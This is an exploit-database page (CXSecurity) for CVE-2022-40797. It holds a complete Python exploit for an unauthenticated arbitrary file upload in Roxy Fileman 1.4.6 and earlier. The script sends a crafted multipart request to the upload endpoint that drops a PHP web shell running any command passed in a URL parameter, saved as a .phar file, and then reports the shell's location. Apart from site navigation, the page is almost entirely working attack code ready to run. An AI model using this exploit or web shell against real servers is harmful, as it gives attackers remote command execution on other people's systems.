---
title: Roxy Fileman 1.4.6 Remote Shell Upload
url: https://cxsecurity.com/issue/WLB-2022110037
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-22
fetch_date: 2025-10-03T23:21:21.617891
---

# Roxy Fileman 1.4.6 Remote Shell Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Roxy Fileman 1.4.6 Remote Shell Upload** **2022.11.21**  Credit:  **[Hadi Mene](https://cxsecurity.com/author/Hadi%2BMene/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-40797](https://cxsecurity.com/cveshow/CVE-2022-40797/ "Click to see CVE-2022-40797")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

# Exploit Title: Roxy Fileman <= 1.4.6 Arbitrary File Upload (Unathenticated)
# Date: 11/12/2022
# Exploit Author: Hadi Mene <hadi\_mene@hotmail.com>
# Vendor Homepage: roxyfileman.com
# Software Link: https://web.archive.org/web/20210126213412/https://roxyfileman.com/download.php?f=1.4.6-php
# Version: <= 1.4.6
# Tested on: Ubuntu 18.04
# CVE : CVE-2022-40797
# https://nvd.nist.gov/vuln/detail/CVE-2022-40797
import requests
from optparse import OptionParser
from os.path import basename
banner = '#################################################\n'
banner += '# Roxy Fileman <= 1.4.6 Arbitrary File Upload #\n'
banner += '#\t\t\t\t\t\t#\n'
banner += '#\tCVE-2022-40797 exploit code\t\t#\n'
banner += '#\t\t\t\t\t\t#\n'
banner += '#\t\t\t\t\t\t#\n'
banner += '# Author : Hadi Mene <hadi\_mene@hotmail.com>\t#\n'
banner += '#\t\t\t\t\t\t#\n'
banner += '#################################################\n'
parser = OptionParser()
parser.add\_option("-u", "--url", dest="url",
help="url of roxy fileman installation")
parser.add\_option("-s", "--shell",dest="shell", default=False,
help="path of the php shell if not specified defaut shell will be uploaded ")
(options, args) = parser.parse\_args()
if options.url is None:
parser.error('URL is required use -h for help')
url = options.url
#It seems that in some versions of the app an '/' in the end of the url breaks the exploit code
if (url.endswith('/')):
url = url[:-1] # we delete that '/'
webroot = options.url.split('/')[3:]
webroot = '/'+ '/'.join(webroot)
if (webroot.endswith('/')):
webroot = webroot[:-1]
webroot = webroot+'/Uploads'
if options.shell:
shell = open(options.shell,'r').read()
filename = basename(options.shell)
filename = filename.split('.')[0]
else:
# default shell
shell = "<?php system($\_GET['cmd']); ?>"
filename = 'shell'
headers = {
'Host': (url.split('/')[2]),
'User-Agent': 'Mozilla/5.0 (X11; Linux x86\_64; rv:102.0) Gecko/20100101 Firefox/102.0',
'Accept': '\*/\*',
'Accept-Language': 'en-US,en;q=0.5',
'Content-Type': 'multipart/form-data; boundary=---------------------------39556237418830295983527604767',
'Origin': (url.split('/')[2]),
'Connection': 'close',
}
data = '-----------------------------39556237418830295983527604767\r\nContent-Disposition: form-data; name="action"\r\n\r\nupload\r\n-----------------------------39556237418830295983527604767\r\nContent-Disposition: form-data; name="method"\r\n\r\najax\r\n-----------------------------39556237418830295983527604767\r\nContent-Disposition: form-data; name="d"\r\n\r\n'+(webroot)+'\r\n-----------------------------39556237418830295983527604767\r\nContent-Disposition: form-data; name="files[]"; filename="'+(filename)+'.phar"\r\nContent-Type: text/plain\r\n\r\n'+shell+'\n\r\n-----------------------------39556237418830295983527604767--\r\n'
#We check if a file with the same filename is already there
#because Roxy doesn't overwrite file instead it changes the filename of the newly uploaded file
if 'href="'+filename+'.phar"' in (requests.get(url+'/Uploads/').text):
already\_uploaded = True
else:
already\_uploaded = False
# file upload
req = requests.post(url+'/php/upload.php', headers=headers, data=data, verify=False)
response = (req.text)
print(banner)
if '{"res":"ok","msg":""}' in (response):
# success
print('File Uploaded Successfully!!!')
if already\_uploaded:
print('A file with the same filename is already on the server..')
print('URL: '+url+'/Uploads/'+(filename)+' - Copy X.phar ')
else:
print('URL: '+url+'/Uploads/'+(filename)+'.phar')
else:
# failure
print('Shell Upload Failed :((( ')
print(response) #debug

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110037)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top